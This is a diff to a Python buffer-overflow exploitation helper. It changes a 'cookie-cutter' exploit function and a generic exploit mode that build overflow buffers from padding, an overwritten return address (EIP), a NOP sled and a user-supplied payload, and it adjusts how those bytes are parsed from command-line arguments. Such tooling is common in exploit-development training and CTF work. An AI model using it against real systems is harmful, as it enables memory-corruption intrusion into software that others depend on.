@@ -25,7 +25,7 @@ def cookieCutterExploit(io = None, silent = None):
     buffer = []
 
     prefix = b''
-    offset = 0
+    offset = 10
     overflow = b'A' * offset
     retn = b'BBBB'
     padding = b'\x90' * 16
@@ -33,7 +33,7 @@ def cookieCutterExploit(io = None, silent = None):
     postfix = b''
 
     bufferEntry = prefix + overflow + retn + padding + payload + postfix
-    buffer.append(bytes(bufferEntry, encoding='utf-8'))
+    buffer.append(bufferEntry)
     send(buffer, io, silent)
 
 #############################################################################################
@@ -50,7 +50,7 @@ def exploit(offset, ret, nop, payload, before = None, io = None, silent = None):
     print('[+] Exploit mode', file=sys.stderr)
 
     buffer = []
-    bufferEntry = (b'A' * int(offset)) + ret + (b"\x90" * int(nop)) + payload
+    bufferEntry = (b'A' * int(offset)) + ret + (b'\x90' * int(nop)) + payload
     buffer.append(bufferEntry)
     send(buffer, io, silent)
 
@@ -321,9 +321,9 @@ if __name__ == "__main__":
     # Exploit options
     parser.add_argument("-e", "--exploit", help="Exploit the application", action="store_true")
     parser.add_argument("-o", "--offset", help="Offset (obtained with pattern/search) to fill before overflow")
-    parser.add_argument("-r", "--ret", help="Return address, eg : override of EIP when overflow occurs. Must be in python byte format, for example \"b'\\x42\\x42\\x42\\x42'\"")
+    parser.add_argument("-r", "--ret", help="Return address, eg : override of EIP when overflow occurs. Must be surrounded by quotes, for example \"\\x42\\x42\\x42\\x42\"")
     parser.add_argument("-n", "--nop", help="Nop sled size, just before the payload")
-    parser.add_argument("-p", "--payload", help="Payload bytes, to put after the Nop sled. Must be in python byte format, for example \"b'\\x42\\x42\\x42\\x42'\"")
+    parser.add_argument("-p", "--payload", help="Payload bytes, to put after the Nop sled. Must be surrounded by quotes, for example \"\\x42\\x42\\x42\\x42\"")
     parser.add_argument("-k", "--cookie", help="Call the cookie-cutter exploit function, written by user", action="store_true")
     parser.add_argument("-y", "--yaml", help="Load the exploit parameters from the given yaml file")
     
@@ -353,8 +353,8 @@ if __name__ == "__main__":
             patternOffset(offset=args.pattern_offset, io=io, silent=args.silent)
         elif (args.exploit):
             if (args.offset and args.ret and args.nop and args.payload):
-                retBytes = ast.literal_eval(args.ret)
-                payloadBytes = ast.literal_eval(args.payload)
+                retBytes = ast.literal_eval("b'" + args.ret + "'")
+                payloadBytes = ast.literal_eval("b'" + args.payload + "'")
                 exploit(offset=args.offset, ret=retBytes, nop=args.nop, payload=payloadBytes, before=args.before, io=io, silent=args.silent)
             else:
                 print('[-] Exploit mode needs offset (-o), return address (-r), nop sled size (-n), and payload (-p)', file=sys.stderr)
